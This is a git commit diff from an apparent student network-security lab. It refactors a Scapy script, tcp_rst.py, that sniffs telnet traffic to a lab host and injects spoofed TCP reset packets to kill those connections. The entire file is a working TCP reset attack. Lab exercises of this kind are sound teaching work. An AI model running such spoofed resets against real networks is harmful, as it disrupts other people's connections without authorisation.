bed9ace41591f3c4f312942ccebf13bd14298a41
alijan-3 <alijan-3@student.ltu.se>
2025-10-06 19:22:44 +0200

    Simplified stuff (I hope)

--- Lab3/tcp_rst.py
+++ Lab3/tcp_rst.py
@@ -1,18 +1,26 @@
 #!/usr/bin/env python3
 
 from scapy.all import *
+
+# Sets up spoofed packet
 def spoof(pkt):
-    ls(pkt)
+    ls(pkt) # Provides details
     ip = IP()
     ip.dst = pkt[IP].dst
     ip.src = pkt[IP].src
     tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="R", seq=pkt[TCP].seq)
     send(ip/tcp, verbose=0)
 
+# Returns network interface
 def get_iface(dest_ip):
     res = subprocess.run(["ip", "route", "get", dest_ip], capture_output=True, text=True, check=True)
-    for token in res.stdout.split():
-        if token == "dev":
-    	    return res.stdout.split()[res.stdout.split().index("dev") + 1]
+    out = res.stdout.split()
+    if "dev" in out:
+        return out[out.index("dev") + 1]
+    raise RuntimeError("Could not find interface")
 
-capture = sniff(iface=get_iface('10.9.0.5'), filter='tcp and port 23', prn=spoof)
+def main():
+    capture = sniff(iface=get_iface('10.9.0.5'), filter='tcp and port 23', prn=spoof)
+
+if __name__ == "__main__":
+    main()
